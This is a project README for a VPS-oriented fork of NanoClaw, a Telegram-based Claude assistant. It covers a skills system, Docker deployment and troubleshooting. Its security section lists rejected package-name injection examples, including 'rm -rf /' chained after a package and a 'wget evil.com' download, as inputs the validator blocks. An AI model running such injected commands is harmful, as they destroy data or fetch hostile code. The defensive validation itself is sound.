<p align="center">
  <img src="assets/nanoclaw-logo.png" alt="NanoClaw" width="400">
</p>

<p align="center">
  <b>NanoClaw VPS Edition</b><br>
  Personal Claude assistant with advanced Skills architecture<br>
  <i>Fork of <a href="https://github.com/gavrielc/nanoclaw">gavrielc/nanoclaw</a> optimized for VPS deployment</i>
</p>

<p align="right">
  <b>English</b> | <a href="docs/zh-TW/README.md">繁體中文</a>
</p>

---

## 🚀 What's New in This Fork

This fork introduces a **production-ready Skills management system** designed for VPS deployment and multi-bot configurations:

### Key Improvements

| Feature | Original | This Fork | Benefit |
|---------|----------|-----------|---------|
| **Skills Architecture** | `.claude/skills/` (main only) | `/skills/` shared directory | All groups can access shared skills |
| **Dependency Management** | Hardcoded in Dockerfile | Declarative `deps.json` | Easy to add/remove dependencies |
| **Build System** | Single Dockerfile | Multi-stage + intelligent detection | Only installs what you need |
| **Development Mode** | Rebuild for every change | Live mount with `dev.sh` | Rapid skill development |
| **Security** | Basic isolation | Package validation + read-only mounts | Protection against injection attacks |
| **VPS Optimization** | Single bot | Multi-bot with shared image | Efficient resource usage |

---

## 📁 Project Structure

```
nanoclaw/
├── skills/                    # 🆕 Shared skills (all groups can access)
│   ├── README.md             # Skills documentation
│   ├── calculator/           # Math operations skill
│   │   ├── skill.md         # Usage documentation
│   │   ├── deps.json        # 🆕 Dependency declaration
│   │   └── calculator.py    # Implementation
│   └── {your-skill}/        # Your custom skills
├── container/
│   ├── Dockerfile           # Original Dockerfile
│   ├── Dockerfile.skills    # 🆕 Multi-stage build with skills
│   ├── build.sh            # 🆕 Intelligent build script
│   ├── dev.sh              # 🆕 Development mode helper
│   └── docker-compose.dev.yml # 🆕 Dev environment
├── src/
│   ├── index.ts            # Main router
│   ├── container-runner.ts # 🆕 Enhanced with shared skills mounting
│   └── config.ts           # Configuration
└── groups/
    ├── main/               # Main group with admin privileges
    └── {group-name}/       # Per-group isolated storage
        ├── CLAUDE.md       # Group memory
        └── .claude/skills/ # Group-specific skills
```

---

## 🎯 Quick Start

### Prerequisites

- Docker Desktop or Docker Engine
- Node.js 22+
- WhatsApp or Telegram account
- Anthropic API key

### Installation

```bash
# 1. Clone this fork
git clone https://github.com/aceonaceon/nanoclaw
cd nanoclaw

# 2. Install dependencies
npm install

# 3. Configure environment variables
cp .env.example .env
# Edit .env and add:
# - CLAUDE_CODE_OAUTH_TOKEN (from claude.ai settings)
# - TELEGRAM_BOT_TOKEN (from @BotFather)
# - ASSISTANT_NAME (trigger word)

# 4. Build container with Skills system
cd container
./build.sh
cd ..

# 5. Test the container (optional but recommended)
./test-container.sh

# 6. Choose your running mode:

# Option A: Development mode (for testing, instant changes)
npm run dev

# Option B: Production mode (for deployment)
npm run build    # Compile TypeScript to JavaScript
npm start        # Run the compiled code
```

### 🎮 Running Modes Explained

| Command | What it does | When to use |
|---------|--------------|-------------|
| `npm run dev` | Run TypeScript directly with hot-reload | Local development, testing changes |
| `npm run build` | Compile TypeScript to JavaScript | Before production deployment |
| `npm start` | Run compiled JavaScript | Production, system services |

**Recommended for most users**:
- **Testing**: `npm run dev` (fastest, auto-reloads)
- **Production**: `npm run build && npm start` (stable, optimized)

---

## 🛠️ Skills System

### What are Skills?

Skills are modular capabilities that extend NanoClaw's functionality. Unlike the original project where only the main group could access project-level skills, this fork allows **all groups to share common skills** while maintaining security through read-only mounts.

### Using Existing Skills

Skills are automatically available to Claude. Simply ask:

- "Calculate sqrt(144) + 2^3" → Uses `calculator` skill
- "Setup NanoClaw" → Uses `setup` skill
- "Post a tweet" → Uses `x-integration` skill

### Adding a New Skill

#### 1. Create Skill Structure

```bash
# Create skill directory
mkdir skills/weather-forecast
cd skills/weather-forecast
```

#### 2. Define Dependencies (`deps.json`)

```json
{
  "skill": "weather-forecast",
  "version": "1.0.0",
  "description": "Get weather forecasts",
  "dependencies": {
    "system": [
      {
        "type": "apt",
        "packages": ["curl"],
        "description": "For API requests"
      }
    ],
    "runtime": {
      "node": [
        {
          "packages": ["axios"],
          "global": false,
          "description": "HTTP client"
        }
      ]
    }
  },
  "enabled": true,
  "builtin": false,
  "author": "your-github-username"
}
```

#### 3. Create Skill Documentation (`skill.md`)

```markdown
---
name: weather-forecast
description: Get weather forecasts for any location
---

# Weather Forecast

Provides current weather and forecasts using OpenWeather API.

## Usage
Ask for weather in any city: "What's the weather in Tokyo?"
```

#### 4. Implement the Skill

```python
#!/usr/bin/env python3
# weather.py
import json
import sys
import requests

def get_weather(city):
    # Implementation here
    return {"temperature": 22, "condition": "sunny"}

if __name__ == "__main__":
    city = sys.argv[1] if len(sys.argv) > 1 else "London"
    result = get_weather(city)
    print(json.dumps(result))
```

#### 5. Rebuild Container

```bash
cd ../../container
./build.sh

# The build script will:
# - Detect your new skill
# - Check if it's enabled
# - Install required dependencies
# - Build optimized image
```

### Enabling/Disabling Skills

Edit `skills/{skill-name}/deps.json`:

```json
{
  "enabled": false  // Set to false to disable
}
```

Then rebuild: `./build.sh`

---

## 🔧 Development Mode

For rapid skill development without rebuilding:

```bash
cd container

# Build development container
./dev.sh build

# Run with live skill mounting
./dev.sh run

# Test a specific skill
./dev.sh test weather-forecast

# Open shell for debugging
./dev.sh shell

# Validate all skills
./dev.sh validate
```

---

## 🚢 VPS Deployment

### Architecture: Docker-in-Docker

NanoClaw on VPS uses a two-layer container architecture:

```
┌─────────────────────────────────────────────────────────────┐
│                     VPS Host (Ubuntu)                        │
│                                                              │
│  Docker Engine                                               │
│  ┌────────────────────────────────────────────────────────┐  │
│  │  Main Container (nanoclaw-bot1)                        │  │
│  │  - Node.js router process                              │  │
│  │  - Telegram connection                                 │  │
│  │  - Docker CLI (controls host Docker via socket mount)  │  │
│  │                                                        │  │
│  │     spawns per-message ──▶  ┌───────────────────────┐  │  │
│  │                             │  Agent Container      │  │  │
│  │                             │  - Claude Agent SDK   │  │  │
│  │                             │  - Sandboxed tools    │  │  │
│  │                             │  - Bind-mounted dirs  │  │  │
│  │                             └───────────────────────┘  │  │
│  └────────────────────────────────────────────────────────┘  │
│                                                              │
│  Volumes: data-bot1/, groups-bot1/, store-bot1/              │
└──────────────────────────────────────────────────────────────┘
```

The **main container** handles Telegram messaging and routing. For each incoming message, it spawns a short-lived **agent container** via the host's Docker socket. Agent containers run Claude with sandboxed tools and bind-mounted group data.

### Prerequisites

- Ubuntu VPS (tested on 22.04/24.04, 2GB+ RAM recommended)
- Docker Engine installed ([docs.docker.com/engine/install](https://docs.docker.com/engine/install/ubuntu/))
- Git
- One of:
  - **Anthropic API Key** from [console.anthropic.com](https://console.anthropic.com/) (pay-per-use, recommended for VPS)
  - **Claude OAuth Token** from a Claude Pro/Max subscription (extract from `~/.claude/.credentials.json` after logging in with `claude`)
- **Telegram Bot Token** from [@BotFather](https://t.me/BotFather) — create a new bot and copy the token

### Deployment Steps

```bash
# 1. Clone the repository
git clone https://github.com/aceonaceon/nanoclaw
cd nanoclaw

# 2. Configure environment variables
cp .env.vps.example .env
nano .env
# Required: set ANTHROPIC_API_KEY (or CLAUDE_CODE_OAUTH_TOKEN) and BOT1_TOKEN

# 3. Initialize directory structure (first-time only)
#    Creates groups-bot1/, data-bot1/, store-bot1/ with correct permissions
./init-vps-dirs.sh

# 4. Build agent container image (first-time, or after updating skills)
cd container && ./build.sh && cd ..

# 5. Start the service
docker compose -f docker-compose.vps.yml up -d --build

# 6. Pair your Telegram chat as the main group
./pair-main-group.sh
# → Open Telegram, send any message to your bot, then confirm in terminal

# 7. Verify it's working
docker compose -f docker-compose.vps.yml logs -f nanoclaw-bot1
```

### Docker Compose Structure

The actual `docker-compose.vps.yml` uses Docker-in-Docker with host socket mounting:

```yaml
services:
  nanoclaw-bot1:
    build:
      context: .
      dockerfile: Dockerfile.vps
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # Controls host Docker
      - ./data-bot1:/app/data         # Bot state & sessions
      - ./groups-bot1:/app/groups     # Group memory & files
      - ./store-bot1:/app/store       # Telegram auth & SQLite DB
      - ./container:/app/container    # Agent container build context
    environment:
      - TELEGRAM_BOT_TOKEN=${BOT1_TOKEN}
      - ASSISTANT_NAME=${BOT1_NAME:-Andy}
      - ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY}
      - HOST_PROJECT_ROOT=${PWD}          # Tells agent mounts to use host paths
      - HOST_GROUPS_DIR=${PWD}/groups-bot1
      - HOST_DATA_DIR=${PWD}/data-bot1
```

To add more bots, uncomment the `nanoclaw-bot2` section in `docker-compose.vps.yml` and set `BOT2_TOKEN` in `.env`.

### Updating & Maintenance

```bash
cd nanoclaw

# Pull latest changes
git pull

# Rebuild and restart
docker compose -f docker-compose.vps.yml up -d --build

# If skills or agent dependencies changed, also rebuild the agent image:
cd container && ./build.sh && cd ..
docker compose -f docker-compose.vps.yml restart
```

### Key Notes

- `init-vps-dirs.sh` sets directory ownership to UID 1000 (the `node` user inside agent containers) — this is critical for bind-mount permissions
- The agent container entrypoint also runs `chown` as a safety net before dropping privileges to `node` via `gosu`
- `HOST_PROJECT_ROOT` env var triggers VPS mode in `container-runner.ts`, which uses host paths for bind mounts instead of container-internal paths
- After pairing, you can chat with the bot directly without trigger words

---

## 🔒 Security Features

### Package Name Validation

The build system validates all package names to prevent injection attacks:

```bash
# ✅ Valid packages
curl, python3, nodejs, @anthropic/sdk

# ❌ Rejected (injection attempt)
curl && rm -rf /, python3; wget evil.com
```

### Read-Only Skill Mounts

Shared skills are mounted read-only in containers:

```typescript
// container-runner.ts
mounts.push({
  hostPath: sharedSkillsDir,
  containerPath: '/workspace/shared-skills',
  readonly: true  // Prevents modification
});
```

### Isolated Group Skills

Each group maintains its own writable skill directory at:
- Host: `groups/{name}/.claude/skills/`
- Container: `/workspace/group/.claude/skills/`

---

## 📊 Comparison with Original

### Architecture Differences

| Aspect | Original (gavrielc) | This Fork |
|--------|---------------------|-----------|
| **Skills Location** | `.claude/skills/` | `/skills/` (top-level) |
| **Skills Access** | Main group only | All groups (read-only) |
| **Dependency Install** | Build-time (hardcoded) | Build-time (declarative) |
| **Skill Dependencies** | In Dockerfile | In `deps.json` per skill |
| **Build Process** | Single stage | Multi-stage with caching |
| **Development** | Rebuild required | Hot-reload with mounts |
| **Container Runtime** | Apple Container | Docker (VPS-friendly) |

### Migration from Original

If you're migrating from the original NanoClaw:

```bash
# 1. Move skills to new location
mv .claude/skills/* skills/

# 2. Add deps.json to each skill
# (See examples above)

# 3. Rebuild with new system
./container/build.sh

# 4. Test
npm run dev
```

---

## 🎨 Customization

### Adding System Packages

Edit skill's `deps.json`:

```json
{
  "dependencies": {
    "system": [
      {"type": "apt", "packages": ["imagemagick", "ffmpeg"]}
    ]
  }
}
```

### Adding Language Packages

```json
{
  "dependencies": {
    "runtime": {
      "node": [{"packages": ["express", "socket.io"]}],
      "python": [{"packages": ["numpy", "pandas"]}],
      "go": [{"package": "github.com/gin-gonic/gin@latest"}]
    }
  }
}
```

### Creating MCP Tools

For skills that need container-side tools:

```typescript
// skills/my-skill/agent.ts
import { tool } from '@anthropic-ai/claude-agent-sdk/mcp/create-server';

export function createMyTools() {
  return [
    tool('my_tool', 'Description', {}, async () => {
      // Implementation
    })
  ];
}
```

---

## 📋 Skill Types

### 1. Documentation Skills
Instructions for Claude without code:
- `setup` - Initial configuration
- `customize` - Modify behavior
- `debug` - Troubleshooting

### 2. Tool Skills
Executable programs:
- `calculator` - Math operations
- `x-integration` - Browser automation

### 3. Integration Skills
Modify NanoClaw itself:
- `add-gmail` - Email integration
- `add-voice-transcription` - Voice support

---

## 🐛 Troubleshooting

### VPS: Agent Container Hangs (No Response)

The most common VPS issue. Check in order:

```bash
# 1. Check if agent containers are spawning
docker ps -a --filter "ancestor=nanoclaw-agent:latest"

# 2. Check agent container processes (find a running one)
docker exec <container_id> ps aux

# 3. Check file permissions inside agent container
docker exec <container_id> ls -la /home/node/.claude/
docker exec <container_id> ls -la /workspace/group/

# 4. If permissions show root:root, re-run init script:
./init-vps-dirs.sh
docker compose -f docker-compose.vps.yml restart
```

**Root cause**: Host creates directories as root, but agent containers run as `node` (UID 1000). The entrypoint `chown` + `init-vps-dirs.sh` fix this.

### VPS: Logs & Debugging

```bash
# Main container logs (router, Telegram connection)
docker compose -f docker-compose.vps.yml logs -f nanoclaw-bot1

# Verbose agent logs
# Edit .env: LOG_LEVEL=debug, then restart

# Per-agent run logs (inside main container's mounted volume)
ls groups-bot1/main/logs/
```

### Skills Not Found

```bash
# Check if skills are mounted
docker run --rm \
  -v "$PWD/skills:/workspace/shared-skills:ro" \
  nanoclaw-agent:latest \
  node /app/validate-skills.cjs
```

### Build Errors

```bash
# Use original Dockerfile as fallback
./build.sh --original

# Check skill dependencies
jq '.dependencies' skills/*/deps.json
```

### Container Errors

```bash
# Check logs
docker logs nanoclaw-agent

# Debug mode
LOG_LEVEL=debug npm run dev
```

---

## 🤝 Contributing

1. Fork this repository
2. Create your skill in `skills/`
3. Add comprehensive `deps.json`
4. Test with `dev.sh`
5. Submit PR with:
   - Skill documentation
   - Test examples
   - Dependencies justified

---

## 📝 License

MIT - See [LICENSE](LICENSE)

---

## 🙏 Credits

- Original project: [gavrielc/nanoclaw](https://github.com/gavrielc/nanoclaw)
- Claude Agent SDK: [Anthropic](https://github.com/anthropics/claude-agent-sdk)
- Skills architecture: This fork

---

## 📚 Resources

- [Skills Documentation](skills/README.md)
- [Container Documentation](container/README.md)
- [API Reference](docs/API.md)
- [Deployment Guide](docs/DEPLOYMENT.md)

---

<p align="center">
  Built with ❤️ for the NanoClaw community<br>
  <a href="https://github.com/aceonaceon/nanoclaw/issues">Report Bug</a> •
  <a href="https://github.com/aceonaceon/nanoclaw/pulls">Submit PR</a>
</p>